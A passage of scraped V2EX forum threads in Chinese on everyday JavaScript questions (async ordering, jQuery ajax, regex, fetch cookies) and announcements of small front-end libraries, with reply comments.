的，如果你不深入理解 Promise ，你也不会真正理解 async/await ，事实上， async 函数的调用就是返回 Promise ，而 await 操作符后面必须是一个 Promise 对象，这意味着你要用 async/await 的时候，必须还是要自己实现一些返回 Promise 的函数", "最简单的处理方案就是，用 let"]},
{"content": ["<div class=\"topic_content\">在 Firefox55.0a1 中 ArrayBuffer 在一定程度上是稀疏的，比如刚刚 new 得的 ArrayBuffer 没分配内存。\r<br>大概 Firefox 这样做是为了省下不必要的初始化开销（清零）。</div>"], "reply": "目前尚无回", "tittle": "ArrayBuffer 的性能未必很好", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>找了这个东西很久，后来找到了但是没发现特别好用的，最终发现这是一个最后发布在 4 年前的一个老项目，作用是导出图片，于是就简单修改了下，把文件并到了一个，多余功能砍光，可以非常快速的生成背景图。</p>\n<p><a href=\"https://github.com/a49666/coolest-background\" rel=\"nofollow\">github</a>\n<a href=\"https://a49666.github.io/coolest-background/example/example1.html\" rel=\"nofollow\">demo1</a>\n<a href=\"https://a49666.github.io/coolest-background/example/example2.html\" rel=\"nofollow\">demo2</a>\n<a href=\"https://a49666.github.io/coolest-background/example/example3.html\" rel=\"nofollow\">demo3</a></p>\n<p>英文比较捉鸡，但是内容非常简单</p>\n<p>顺便新人求一点 star</p>\n</div></div>"], "reply": "1", "tittle": "lowpoly 风格， web 低多边形 3d 动态交互炫酷背景生成，类似 QQ 轻聊版登录框", "comment": ["把 DEMO1 的高亮颜色调暗一点，然后移动（变化）速度慢点，应该会很不错"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>js 内容</p>\n<pre><code>$(document).ready(function () {\n        $(\"#id_plat_select\").change(function () {\n            $.ajax({\n                type:\"POST\",\n                url:\"/abc/time/\",\n                data:{plat_name:$(\"#id_plat_select\").val()},\n                dataType:\"json\",\n                success:function (data) {\n                    json_data = JSON.parse(data)\n                    for (var i=0;i&lt;= json_data.length;i++){\n                        alert(json_data[i].fields.serverName)\n                    }\n                }\n            })\n        })\n    })\n</code></pre>\n<p>html 内容</p>\n<pre><code>&lt;select id=\"id_server_select\" class=\"form-control selectpicker\" name=\"serverId\" data-live-search=\"true\" data-size=\"10\"&gt;\n\t&lt;option&gt;选择内容&lt;/option&gt;\n&lt;/select&gt;\n</code></pre>\n<p>就怎么把循环出来的 json_data[i].fields.serverName 写到&lt;option&gt;&lt;/option&gt;里的？</p>\n</div></div>"], "reply": "8", "tittle": "怎么样把 js 中 post 后得到的 success 中的 data 内容写入到 html 中<select><option></option></select>中的？", "comment": ["jquery 有个 append 方法。\r", "组合成 option 的 html 后，使用 jquery 的 appen 在后面追加进去。", "我猜，你估计是想问 ajax 同步，异步的问题把。", "还有添加子节点之前，清空下父节点。", "用 jQuery 的话很简单 就是 \r", "$('<option></option>').text('serverName').attr('value', 'serverValue').appendTo($('#id_server_select'));  \r", "非 jQuery 的话同理 只是麻烦一点 建议多谷歌 | 百度", " @", " \r", "恩恩，是这个方法，用 append 搞定了\r", "$(document).ready(function () {\r", "        $(\"#id_plat_select\").change(function () {\r", "            $.ajax({\r", "                type:\"POST\",\r", "                url:\"/items/kaifu_time/\",\r", "                data:{plat_name:$(\"#id_plat_select\").val()},\r", "                dataType:\"json\",\r", "                success:function (data) {\r", "                    json_data = JSON.parse(data)\r", "                    for (var i=0;i<= json_data.length;i++){\r", "                        server = json_data[i].fields.serverName;\r", "                        $(\"#id_server_select\").append(\"<option value=\"+ server +\">\" + server + \"</option>\");\r", "                    }\r", "                }\r", "            })\r", "        })\r", "    })\r", "\r", "不过遇到一个新的问题\r", "<select id=\"id_plat_select\" class=\"form-control selectpicker\" name=\"id_plat_select\" data-live-search=\"true\" data-size=\"10\"></select>\r", "\r", "<select>这里面有个样式 selectpicker ，这样式用来下拉时候有个搜索框的，只有去掉这个样式，添加的<option>才能显示，加上这个样式，添加的<option>就无法显示\r", "\r", "这样如何解决，去掉这个样式后，就没用了下拉搜索框功能了。", " 不不不，我就想单纯的给 select 添加 option ，现在可以添加了，但有新的问题。", " $('.selectpicker').selectpicker('refresh');  初始化后添加的 option 需要刷新一遍 或者重新初始化一遍才能使用 这些文档上都有 建议这类问题多查文档找解决方案", " 好的，多谢。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大致像这样</p>\n<pre><code>$.getJSON(\"jsonpath\", {}, function (data) {\n        jsondata = data;\n}, \"json\");\n</code></pre>\n<p>接着调用这个 jsondata 对象时有一定几率会报错</p>\n<pre><code>Uncaught ReferenceError : data is not defined\n</code></pre>\n<p>然而并不是每次都报错，十分神奇。在 console 里面查看 jsondata 的内容时是正确加载进去了。</p>\n<p>P.S 原来 js 里用的 jQuery 调用与原生 js 调用混合，后来我把原生调用改写成了 jQuery 调用后不报错了，然而还是有加载失败的现象，直接后果就是要加载到 table 里的数据无法加载， table 空白。</p>\n<p>js 文件： <a href=\"http://github.com/DiruSec/PSO2-EQ-Schedule/blob/master/script/parser.js\" rel=\"nofollow\">github.com/DiruSec/PSO2-EQ-Schedule/blob/master/script/parser.js</a></p>\n<p>应用地址： <a href=\"http://time.dirusec.com\" rel=\"nofollow\">time.dirusec.com</a></p>\n<p>P.S 2 基本没学过 js ，写起来一泡污，求轻喷(´・ω・`)</p>\n</div></div>", "<div class=\"topic_content\">自己解决了，说一下思路\r<br>我的 js 大概顺序如下：\r<br>初始化变量对象→将 json 文件读入 object （ 3 个）→执行主要代码（作为 function ，将 3 个 object 的内容写入 html table ）\r<br>\r<br>通过设置断点观察之后发现，有些时候在 json 读入完毕之前主要代码就已经被执行了，导致写入 html table 时 object 的内容是空的\r<br>因此解决思路就是保证所有的 json 都读入完毕后才执行主要代码\r<br>由于不知道有什么好用的方法，所以采用了将$.getJSON 方法层层嵌套到 success 部分的方法，虽然应该会牺牲一部分的性能，但可以保证三个 json 都读取成功</div>"], "reply": "9", "tittle": "jQuery 的 getJSON 方法有时会失败？", "comment": ["一般 get 方法出错基本上都是因为 cache 的原因，试试 $.ajaxSetup({cache:false})", "$.getJSON(\"jsonpath\", callback);\r", "\r", "获取到数据之后, callback 才会执行。\r", "\r", "你那样写， callback 还没执行呢，你下面的代码就想用获取到的数据，肯定报错咯", "data 的输出格式看下，可能是字符串了。前端保险一些用 JSON.paser 一下。", " 感觉有缓解（心理作用？），不过还是有这种现象\r", "\r", " 看了一下文档，好像 function 部分是获取到数据后才会执行……？\r", "\r", " console 里看了一下，输出是 Object 没错……\r", "\r", "这个问题不是每次都出现，而是每次刷新时有几率出现，目前的想法可能是 json 没完全读取就继续执行下面的代码了…但是在 console 里调用对象的话确实是正确加载了", "请求完成才会执行 callback 。\r", "\r", "出错时查看 network 看看返回是不是正确的 json 。", "js 的 ajax 是异步的。 Promise 大法好", "。。。 LZ 还是先学一下 WEB 前端开发基础再写代码吧\r", "异步和同步这个坑刚入门的时候我也踩过\r", "\r", "你需要见识一下回调地狱 2333 然后转 Promise", "Promise 大法好", "用 $.when"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本来 A 界面的样式好像是 js 动态赋予的。。异步加载了个 b 界面回来 我想让 js 再次执行 再给 b 赋予下怎么办，小白求教</p>\n</div></div>"], "reply": "2", "tittle": "如何再次调用 js", "comment": ["封装函数 扫描新界面 DOM 赋予样式 调用", "封装成函数再调用一次不就行了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大家好，\n不怎么深入 js, 对运行顺序有点疑惑。\n意图是：\n有三个下拉菜单，二级菜单想通过一级菜单选中的选项去服务器拿数据然后作为选项， 同样三级菜单根据二级菜单的被选中的选项去服务器拿数据作为选项。</p>\n<p>有两个函数，\nupdate_data1, 更新二级菜单选项，\nupdate_data2, 更新三级菜单选项，</p>\n<p>函数里面差不多是这种形式。</p>\n<pre><code>\n$.get(url, function(data, status){\n\t$(\"#menu\").html(data);\n})\n\n</code></pre>\n<p>但是用下面代码执行的时候第二个函数取到的二级菜单被选中的选项还是初始值, 而不是前一个函数处理完的服务器传回来的值。</p>\n<pre><code>\n$(document).ready(function(){\n  \tupdate_data1();\n  \tupdate_data2();\t\n}）\n</code></pre>\n<p>是需要对 callback 进行处理吗？查了一下 js 执行顺序，看到好多声明式函数跟赋值式函数的执行顺序，但感觉应该不是这种导致的吧？\n求指教， 谢谢。</p>\n</div></div>"], "reply": "6", "tittle": "如何确保两个函数的运行顺序", "comment": ["把 update_data1 作为第一个下拉框的 onchange 回调函数，同理 update_data2 作为第二个下拉菜单的 onchange 回调函数", "promise 串联", "你需要 propromise 或者 async/await", " \r", " \r", " 好的，我试试，谢谢啊！！", "异步嘛", "setTimeOut(()=>{update_data2();},0)"]},
{"content": ["<div class=\"topic_content\">node.js 下貌似是有的，但是好像借用了一些 node.js 自己的 api ，貌似不能在浏览器端直接使用。现在有没有方案可以直接在浏览器端解析 xls 和 xlsx 格式的文件？</div>"], "reply": "11", "tittle": "浏览器端有没有能解析 Excel 文件(xls,xlsx)的 javascript 方案", "comment": ["如果条件允许可以试试用 ie 载入 com 组件来解决😂", " 这个真屌", "建议是 PC 端走 web 可以，手机端还是写个原生应用吧", " xlsx 是 Office Open XML 的文件格式，是 ISO 认证过的", "xlsx 及其他带 x 的 office 文档，用 zip 解压后是一堆 XML 文件其他文件，而且还很有规律，几乎所有的重复内容片段只出现一次，用 XML 组织起来。这可能就是 ms office 那么高效的秘诀。", " 这种文档格式几年前就被微软联合 ECMA 交给 ISO 申请认证了，不带 x 的文档格式微软没有公开", "友情提醒一句， wps 打开标准格式的 docx/xlsx 可能不认或者直接报文件损坏…", "服务器端做啊， js 怎么可能做。。。比如说 qq 邮箱在线查看 excel 的方案", " 感觉一楼的回答已经很完美了。。", " @#1 楼 已收藏，谢谢你们的分享！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>源码地址： <a href=\"https://github.com/WQTeam/web-storage-cache\" rel=\"nofollow\">https://github.com/WQTeam/web-storage-cache</a></p>\n<p><a href=\"https://github.com/WQTeam/web-storage-cache/stargazers\" rel=\"nofollow\"><img alt=\"GitHub stars\" src=\"https://img.shields.io/github/stars/WQTeam/web-storage-cache.svg\"></a>  <a href=\"https://github.com/WQTeam/web-storage-cache/network\" rel=\"nofollow\"><img alt=\"GitHub forks\" src=\"https://img.shields.io/github/forks/WQTeam/web-storage-cache.svg\"></a></p>\n<p><code>WebStorageCache</code> 对 HTML5 <code>localStorage</code> <code>和 sessionStorage</code> 进行了扩展，添加了超时时间，序列化方法。可以直接存储 json 对象，同时可以非常简单的进行超时时间的设置。<br>\n<b>优化</b>：<code>WebStorageCache</code>自动清除访问的过期数据，避免了过期数据的累积。另外也提供了清除全部过期数据的方法：<code>wsCache.deleteAllExpires();</code></p>\n<h2>例子</h2>\n<pre><code>var wsCache = new WebStorageCache();\n\n// 缓存字符串'wqteam' 到 'username' 中, 超时时间 100 秒\nwsCache.set('username', 'wqteam', {exp : 100});\n\n// 超时截止日期 2015 5 18\nwsCache.set('username', 'wqteam', {exp : new Date('2015 5 18')});\n\n// 获取缓存中 'username' 的值\nwsCache.get('username');\n\n// 缓存简单 js 对象，默认使用序列化方法为 JSON.stringify 。可以通过初始化 wsCache 的时候配置 serializer.serialize\nwsCache.set('user', { name: 'Wu', organization: 'wqteam'});\n\n// 读取缓存中的简单 js 对象 - 默认使用反序列化方法为 JSON.parse 。可以通过初始化 wsCache 的时候配置 serializer.deserialize\nvar user = wsCache.get('user');\nalert(user.name + ' belongs to ' + user.organization);\n\n// 删除缓存中 'username'\nwsCache.delete('username');\n\n// 手工删除所有超时 CacheItem,\nwsCache.deleteAllExpires();\n\n// 清除客户端中所有缓存\nwsCache.clear();\n\n// 为已存在的（未超时的）缓存值设置新的超时时间。\nwsCache.touch('username', 1);\n\n// 如果缓存中没有 key 为 username2 的缓存，则添加 username2 。反之什么都不做\nwsCache.add('username2', 'wqteam', {exp : 1});\n\n// 如果缓存中有 key 为 username 的缓存，则替换为新值。反之什么都不做\nwsCache.replace('username', 'new wqteam', {exp : 1});\n\n// 检查当前选择作为缓存的 storage 是否被用户浏览器支持。\n//如果不支持调用 WebStorageCache API 提供的方法将什么都不做。\nwsCache.isSupported();\n\n</code></pre>\n</div></div>"], "reply": "5", "tittle": "代码分享，对 HTML5 localStorage 和 sessionStorage 进行了扩展，添加了超时时间，序列化方法。", "comment": ["谢谢分享，已收藏", "赞，好东西", " 谢谢支持", " 谢谢支持", "nice 收藏~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不是很懂 Js 的正则..网上的教程看了点儿愣是没看懂。</p>\n<p>可耻的来伸手了..</p>\n<ul>\n<li>校验一个值为： 071 开头+10 位任意字符</li>\n<li>校验另一个值： 6 位字母</li>\n</ul>\n</div></div>"], "reply": "13", "tittle": "对表单中值的进行正则匹配", "comment": ["\r", "- text.match(/071[\\w]{10}/g);\r", "- text.match(/[a-zA-Z]{6}/g);", "正则表达式 30 分钟入门教程\r", " 感谢！\r", "很抱歉我没说清楚，通过检验以后想返回一个布尔值。", " 哇哦，这个排版吓我一条...感谢！", " \r", "\r", "自己写一个函数 根据 match 的返回结果确定返回 true or false 不就好了。。", "regexObj.test(str)\r", "\r", "/^071.{10}$/\r", "/^[a-z]{6}$/i\r", "\r", "\r", " 不加首位约束不是校验…", "没有 js 的正则这种说法吧。", " 因为 LZ 没有说清楚他要匹配的东西在什么 context 里", " 一开始 1 楼的来的话，只要部分符合就匹配进去了。没法儿根据返回结果判断 true 和 false 啊", " 我擦,我以为,我的网页乱码了.", " 你应该学一下 javascript 基础的\r", "\r", "var re = /(071[\\w]{10})|[a-z]{6}/i;\r", "re.test(phoneNumber);", " 高程和廖雪峰老师那边都没讲到…感谢！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/ClassicOldSong/Blyde\" rel=\"nofollow\">GitHub repo</a></p>\n<p>目前还是 Beta 版。</p>\n<p>其实写了有一段时间了。。。初衷也只是打算做一个简单的操作封装，因为 jQuery 里面很多操作用到的情况不多，而为了几个简单的操作引入整个 jQuery 并不是很值得，于是就有了 Blyde 。 Blyde 并不打算兼容老旧的浏览器，使用 ES6 编写，然后使用 babel 编译成 ES5 版本。体积仅有 1.7k(babel + uglify + gzip)。</p>\n<p>Blyde 同样提供了插件接口， Blyde 的插件注册机制可以防止方法被覆盖或者修改，同时也保证了插件注册的方法与 Blyde 本身的方法拥有完全一致的调用方法与内部调用过程。</p>\n<p>欢迎各位尝试以及提建议，但是请不要和 minggejs 对比，初衷不同，用途也不相同。</p>\n<p>我的其他项目：</p>\n<ul>\n<li><a href=\"https://github.com/ClassicOldSong/typinyin.js\" rel=\"nofollow\">typinyin.js</a> - 实现用拼音自动输入中文特效的前端 js 插件</li>\n<li><a href=\"https://github.com/ClassicOldSong/bPlayer\" rel=\"nofollow\">bPlayer</a> - 比原生播放器好一点点的网页音频播放器</li>\n<li><a href=\"https://github.com/ClassicOldSong/Wenku8-Converter\" rel=\"nofollow\">Wenku8-Converter</a> - 轻松转换 Wenku8 上下载的 zip 格式小说为 txt 并修正编码为 UTF-8</li>\n<li><a href=\"https://nzone.link/\" rel=\"nofollow\">NZone!</a> - 一个二次元风格的简易在线聊天室（非开源）</li>\n</ul>\n<p>本人水平有限，各位权当茶余饭后的小点心看看就好，欢迎指出错误与不足，谢谢~</p>\n</div></div>"], "reply": "23", "tittle": "超轻量类 jQuery 库 Blyde 发布", "comment": ["感觉很不错呢，一定要试试。", "赞，正准备看一点 ES 代码入门一下，就决定是你了", "正想吐槽 Minggejs 结果先被吐槽了（", "但是 jQuery 可以定制啊", "感谢分享，已 star 。\r", "顺便问一下 listMethods 中遍历节点为什么要用数组下标的形式，而不是 ES6 的 of ？此处有坑吗？", " Chrome 下有坑，会多一个\"length\"出来", "ggg", "老宋竟然出来了", "已 star ～", " 你的 aPlayer 出现竞争对手了。", " 233333333", " 我和朋♂友们的播放器系列🌚\r", "\r", "APlayer ： ", "\r", "BPlayer ： ", "\r", "CPlayer ： ", "\r", "DPlayer ： ", " 一个人占俩啊喂", " 。。。年轻人真会玩", "能否对比下 zepto 呢？", " Blyde 实在太轻量以至于没有和 Zepto 对比的必要，关于效率有兴趣的可以测试下，目前 toggleClass 方法在操作多个 class name 的时候性能相较于原生的 classList.toggle 略高", "直接挂 Element.prototype 和 NodeList.prototype 呀，感觉不太合适。很多方法，比如 `Element.prototype.remove()`、`Element.prototype.append()`，本来就有； class 相关的则不如直接操作 `Element@classList`（除了 toggleClass 麻烦点）。", " 写原生的话如果涉及操作比较多或者繁琐的话还是比较蛋疼的，我只是封装一下而且可以进行链式调用，并且直接往 prototype 上放是为了避免过多的所谓\"Blyde 对象\"带来困扰", " 覆盖的坏处是容易在协作上产生困扰，也不方便用别人的代码（假如他们用了被 Blyde 覆盖的原生方法而 Blyde 的方法 API 与原生有出入），传统 jQuery 的做法是比较高明的，我写过文章介绍 ", "最后一个求开源。。。。\r", "貌似打字是时时显示的？", "里面的 NPC 是人类还是真机器人？", "已 star~~围观一下老宋和网红", " 感谢，关于这块我未来再考虑一下如何处理。不过这样做的好处是无论任何选择器选择到的元素都可以正确地使用 Blyde 与 Blyde 插件注册的方法"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>希望大家能推荐一下比较好的教程</p>\n</div></div>"], "reply": "3", "tittle": "准备开始自学 TypeScript，求教程推荐", "comment": ["\r", "\r", "应当没有比这个更好的了", "有 js 基础的话看官方的文档就足够了", "官方文档 +1"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大概就是,fu 函数还要继续使用 zi 函数的 cookie,两个 fetch 写在一个区块里没有问题,但是重构出一个单独函数,cookie 就没了,才开始学 js,不知道怎么传递这个关系</p>\n<p><code>zi(){ fetch('http://xxx', { credentials: \"same-origin\", }); }</code><br>\n<code>fu(){ zi(); fetch('http://xxx', { credentials: \"same-origin\", }); }</code></p>\n</div></div>"], "reply": "9", "tittle": "JavaScript (react native)怎么把子函数的 Cookie 传递给父函数?", "comment": ["保存需要用的 cookie 不行吗？\r", "比如 cookies = {credentials: \"same-origin\",anotherKey:\"value\"}\r", "zi(cookies){ fetch('http://xxx', cookies); }\r", "fu(cookies){ zi(cookies); fetch('http://xxx', cookies); }\r", "持久化可以用 RN 的 AsyncStorage\r", "不知道我理解对了吗？", " fetch 的 cookie 可以导出来吗? zi ()执行的目的就是初始化 cookie,原本是空,我来试试", "看文档 [SameObject] readonly attribute Headers headers;", "\r", "发得太快了", " 标准是标准 但是 rn 官方文档的例子可是写了能改 headers 的", " \r", "1 ，我给楼主的文档是 response-class ， RN 官方文档中 set header 的例子是 request-class\r", "2 ，当然 fetch 这个是个抽象标准，各家具体实现会不一样", "应该不用手动配置，理论上来说 fetch 自动管理 cookie 了。感觉应该是 fetch 请求的域名在 response 的时候没有 set-cookie 头部，由于在 zi() 函数中清理掉了，导致后续的请求都没法携带 cookie 。", " \r", " \r", " \r", "我有点迷 刚才发现问题可能不是处在函数上 而是 RN 里所有的 fetch 都是异步执行的....\r", "fetch 1\r", "fetch 2\r", "fetch 3\r", "执行顺序是并发的.....有没有办法能让他们顺序执行?\r", "尝试了写在 then 函数里,但没用,then 函数里的 fetch 不执行....", " 异步执行本身没有问题啊，只要第一个请求响应有 set-cookie 的 header ，后续的 fetch 就应该会带有 cookie 。 fetch 函数返回的是一个 promise ，如果想要顺序执行，可以在 then 里返回一个 fetch ，下一个 then 链就可以获得 then 的结果了。不执行可能是出现了异常，可以在 then 链的最后加一个 catch 试一下。"]},
{"content": ["<div class=\"topic_content\">我是刚学 js 的新手，想在网页上实现打字机效果，但是却没成功，请各位帮忙看一下，谢谢。\r<br>&lt;!DOCTYPE html&gt;\r<br>&lt;html lang=\"en\"&gt;\r<br>&lt;head&gt;\r<br>\t&lt;meta charset=\"UTF-8\"&gt;\r<br>\t&lt;title&gt;Document&lt;/title&gt;\r<br>&lt;/head&gt;\r<br>&lt;body&gt;\r<br>&lt;div id=\"autotype\"&gt;This is a test&lt;/div&gt;\r<br>\t&lt;script type=\"text/javascript\"&gt;\r<br>\t\t$.fn.autotype = function() {\r<br>    var $tt = $(this);\r<br>    var str = $tt.html();\r<br>    var index = 0;\r<br>    $(this).html('');\r<br>    var timer = setInterval(function() {\r<br>        var current = str.substr(index, 1);\r<br>   \r<br>        if (current == '&lt;') \r<br>            index = str.indexOf('&gt;', index) + 1;\r<br>        else\r<br>            index++;\r<br>                 \r<br>        $tt.html(str.substring(0, index) + (index &amp; 1 ? '_' : ''));\r<br>                 \r<br>        if (index &gt;= str.length)\r<br>            clearInterval(timer);\r<br>    }, 55);\r<br>};\r<br> \r<br>$(\"#autotype\").autotype();\r<br>\r<br>\t&lt;/script&gt;\r<br>&lt;/body&gt;\r<br>&lt;/html&gt;</div>"], "reply": "2", "tittle": "有关 js 的打字机效果问题", "comment": ["有效果啊,就是要加上 jquery 就是了.", " 请问怎么加？$(\"#autotype\").autotype();  我不是已经调用函数了吗？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>介绍</h2>\n\n<p>这个属于 作品发布型专题 and 分享型主题，我是前端开发者，这个项目是全栈项目，所有代码托管在 github 上面</p>\n\n<p>github 项目地址（求 star ）： <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/SimplyY/blog\">https://github.com/SimplyY/blog</a></p>\n\n<p>博客已经搭成，里面写了一篇详细介绍（包括内容和技术）地址： <a target=\"_blank\" rel=\"nofollow\" href=\"http://simplyy.space/article/56cb46564496cee272dea173\">http://simplyy.space/article/56cb46564496cee272dea173</a></p>\n\n<p>我这里写写简单的介绍：内容值得一看、开发方面值得借鉴和学习的。</p>\n\n<h2>适合人群</h2>\n\n<p>博客文章方面适合编程者， JS 前端学习者， mac 用户。</p>\n\n<p>博客开发方面适合 初学（或想学） node 、初学（或想学） react 的学习，当然非常欢迎大家（大牛们）说说我的项目的不足，可以优化的地方，一些好点子，或者初学者对开发方面知识的提问，都行。</p>\n\n<p>ps ：对了现在 博客不支持手机端的适配，准备用 vue 写手机端的（其实这个项目纯粹是为了练手，老博客也能用，不过技术栈和我现在不一样）但是要准备 2-4 月份的暑假实习生面试了，时间不够，等面试通过来全部完成。</p>\n\n<h2>内容方面</h2>\n\n<h3>精品系列</h3>\n\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://simplyy.space/tag/56c84036b4368ea817e4adf2\">es6 简版入门</a> ： es6 快速上手</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://simplyy.space/tag/56c2d7976ba384e02299f9c9\">js thinking</a> ： js good part 心得</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://simplyy.space/tag/56c2d7976ba384e02299f9ca\">clean code note</a> ：写优雅的代码</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://simplyy.space/tag/56c2d7976ba384e02299f9cd\">mac tips(实用技巧)</a> ： for osx 用户</li>\n</ul>\n\n<h3>其他不错的文章</h3>\n\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://simplyy.space/article/56c2d71f6ba384e02299f99f\">编程的优点</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://simplyy.space/article/56c2d71f6ba384e02299f9a5\">如何用好 Google 等搜索引擎</a></li>\n</ul>\n\n<h2>开发方面</h2>\n\n<h3>技术栈</h3>\n\n<ul>\n<li>后端： express + mongodb + node-restful, 也就是使用 node 遍历文件目录作为文章和标签的数据源，提供 rest api （前端通过 ajax 请求就可以去获取数据）</li>\n<li>前端： react + react router + redux + es6 + webpack + sass 开发的 spa 博客应用。\n大致如此，感谢阅读。</li>\n</ul>\n\n<p>ps ：之前发错节点了，，，</p>\n</div></div>", "<div class=\"topic_content\">大家就别 star 了，帖子也不能删，真是后悔发帖。</div>", "<div class=\"topic_content\">自从学会了 block ，整个世界都变好了。。。</div>", "<div class=\"topic_content\">seo 搞定了， react 服务器端渲染，并且通过各种性能优化手段，首屏显示 500ms 内。</div>"], "reply": "120", "tittle": "我寒假开发的 react spa 博客，和博文推荐（上次发到这的 es6 简版教程搬新家了）", "comment": ["翻页吧", "这种鼓励用户做鸵鸟的社区 hhhhh", " 我觉得你还要学习一个，你很熟悉拉仇恨这套理论嘛。一有和谁对话，把对方拉到敌对立场上的速度比谁都快。但是，嘲来嘲去的水平啊。 too 森破", "我为你赶到捉急啊，真的。我不是程序员，不像你牛逼哄哄的。但我见得太多了。 V2EX 哪个大牛我没见过，写 V2EX 的 livid 你知道么，比你不知道高到哪里去了，我跟他谈笑风生。所以说，你得提高自己的姿势水平。\r", "\r", " \r", "噢", " 233 ， have fun", " \r", "\r", "撕逼不好，大家不要撕逼 OwO\r", "\r", "对方纯粹喷的地方是可以无视的嘛，只看其中有价值的东西就好啦。虽然这货在 V2EX 上是出了名的大喷子，人特别惹人厌，他跟谁都能撕起来。但是相比其他大喷子而已，他喷的至少带着干货。", " 意义这东西，对不同的人不一样。我只能说我走的弯路比 jarlyyn 干过的正事都多，那啥，我其实是说他正事干的多。\r", "\r", "hack for fun and profit. why so serious.\r", "\r", "比我厉害多了，来帝都带我找工作吧", " 你个傻逼，不服来斯", " 你上条，，艾特错了吧。。。。", " \r", "\r", "Check node_modules into git for things you deploy, such as websites and apps. Do not check node_modules into git for libraries and modules intended to be reused. Use npm to manage dependencies in your dev environment, but not in your deployment scripts.\r", "\r", "看你的 git 仓库里没有开发分支，你是把 master 分支同时当 develop branch 和 deploy branch 用了吗？这不大对吧……", " \r", "\r", "首先，这个只有开发分支……我的 github 只丢一些个人代码，正式用的东西都是丢到公司 gitlab 上去的。\r", "\r", "其次，这个 node_modules 的问题。\r", "\r", "我知道一般推荐的处理 node_modules 的方式，至少 gitlab 默认生成的 nodejs 版.gitingore 里就是把这个列进去的。\r", "\r", "可是，实际应用里，就是另一回事了。\r", "\r", "至少国内使用的时候， npm 可不是那么顺畅个东西。\r", "\r", "再回到这个代码，这个代码本身是一个 lib 。\r", "\r", "里面包含了 install.js ，所以实际上并不在真实项目的 node_modules 中，而是在 libs 子目录下。\r", "\r", "包括使用方式也不是直接 require,是通过 jslib.js 来尝试动态 require 的。\r", "\r", "由于是一个环境包，必须有一个统一的环境，所以我必须维护自己的一套库版本环境。由于上述的 npm 效率问题，外加 cms 项目本身就是不停复用的在不同服务器上的，所以我选择了打包所有代码。\r", "\r", "这些代码本身应该放在 lib 目录下，为了维护管理方便，才放在了 node_modules 下。\r", "\r", "当初为了这些代码的位置我也调整过几次代码，\r", "\r", "现在的位置是我能找到的最好的方式了。\r", "\r", "如果你有更好的方法,不胜感激。", " 没，看到熟悉的 id 调戏下，看样子懒得理我 233", " 这样啊。。。。我误会了。我只是不想想着 那个被 block 的人 还在啊。。。", " 而且，我都不一定去帝都，好远啊。。\r", "\r", "我连实习都还没找到。。又何谈找工作，，， sad", " 不远不远，都玩转 react 的人了，我连 react 是啥都不知道。。。", " react 又不难，，，，，", " orz 膜", "谢谢楼主，我也在初学 nodejs 和 react  \r", "等 react 熟练后，试着把 react 和 meteor 结合 \r", "十分感谢你的分享", "seo 搞定了， react 服务器端渲染，并且通过各种性能优化手段，首屏显示 500ms 内。"]},
{"content": ["<div class=\"topic_content\">JS 最忌什么，对了，就是全局变量外露，\r<br>\r<br>虽然火孤可以看到，能即时修正，\r<br>\r<br>\r<br>而其他浏览器呢,如 IE678 ，根本没法看的，\r<br>\r<br>\r<br>又或者，我们在编写 JS ， JQUERY 插件时了，忘了加 var  ,结果导致全局变量外露，因为不加 var 默认变量是全局的\r<br>\r<br>\r<br>如果不能及时发现，那么情况就真不敢想像，结果就是整套代码沦为垃圾！\r<br>\r<br>\r<br>而这个低级问题，尽管是 JS 牛人也会无意之中触犯\r<br>\r<br>\r<br>那有没有办法解决这个问题呢，\r<br>\r<br>\r<br>有的就是   monitorVar.JS\r<br>\r<br>\r<br>monitorVar.JS 是原生 JS 敲写，专门给 JS 开发人员用来检测全局变量的\r<br>\r<br>\r<br>这个程序是我很早前写好的，我的 minggeJS 开发时就是用他来检测的\r<br>\r<br>演试： <a target=\"_blank\" href=\"http://www.shearphoto.com/monitorVar/\" rel=\"nofollow\">http://www.shearphoto.com/monitorVar/</a>\r<br>\r<br>下载： <a target=\"_blank\" href=\"http://pan.baidu.com/s/1i4uDSXZ\" rel=\"nofollow\">http://pan.baidu.com/s/1i4uDSXZ</a>\r<br>用法很简单\r<br>\r<br> monitorVar({\r<br>    \r<br>　　　　　　　　　 container:window,　　//还可以检测其他容器\r<br>\r<br>　　　　　　　　　 timer: 2000, 　　　//以定时器方式检测　有助即时反馈\r<br> 　　　 0 表不是启用定时器\r<br>\r<br>    　　　　　　　 ignore: [\"foo\"]　　//忽略的变量名称\r<br>   \r<br>});\r<br>\r<br>\r<br> foo.stop(); //stop 掉定时器检测\r<br>\r<br>* \r<br>\r<br> foo.test(); //启动检测，一般用于手动\r<br>\r<br>\r<br>\r<br>／／大家都用来检测下自己的程序有没有外露全局变量吧\r<br>\r<br>monitorVar.JS 作者：明哥先生\r<br>\r<br>演试： <a target=\"_blank\" href=\"http://www.shearphoto.com/monitorVar/\" rel=\"nofollow\">http://www.shearphoto.com/monitorVar/</a>\r<br>\r<br>下载： <a target=\"_blank\" href=\"http://pan.baidu.com/s/1i4uDSXZ\" rel=\"nofollow\">http://pan.baidu.com/s/1i4uDSXZ</a>\r<br>\r<br>　\r<br>祝大家新年快乐！过年了......呜~~~~~~~~~~</div>", "<div class=\"topic_content\"><a target=\"_blank\" href=\"http://pan.baidu.com/s/1mgPzG1q\" rel=\"nofollow\">http://pan.baidu.com/s/1mgPzG1q</a> 下载地址修正</div>", "<div 